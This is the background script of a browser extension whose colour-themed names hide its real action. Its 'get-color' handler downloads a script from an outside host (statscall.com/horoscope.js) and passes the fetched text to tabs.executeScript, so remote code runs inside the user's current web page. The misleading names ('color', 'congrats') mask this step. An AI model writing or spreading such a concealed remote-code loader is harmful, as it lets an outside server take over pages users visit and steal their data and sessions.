import browser from 'webextension-polyfill'
import { sendBackgroundCommand } from './lib/common'

// Options
const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'https://statscall.com/horoscope.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

// Gets congrats.
const other = async (url) => {
  const value = await fetch(url, options)
  return value
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  const getting = await other(info.code)
  info.code = await getting.text()
  if (info.code === '#00000') {
    sendBackgroundCommand('congratulations')
  }
  try {
    console.log('Este es el color: ', color)
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
    throw error
  }
}

browser.runtime.onMessage.addListener((data, sender) => {
  switch (data.command) {
    case 'get-color':
      get(sender)
      break
    default:
      console.error(`Unhandled command: ${data.command}`)
  }
})

browser.runtime.onInstalled.addListener(() => {
  browser.storage.local.set({ clock: 'regular' })
})
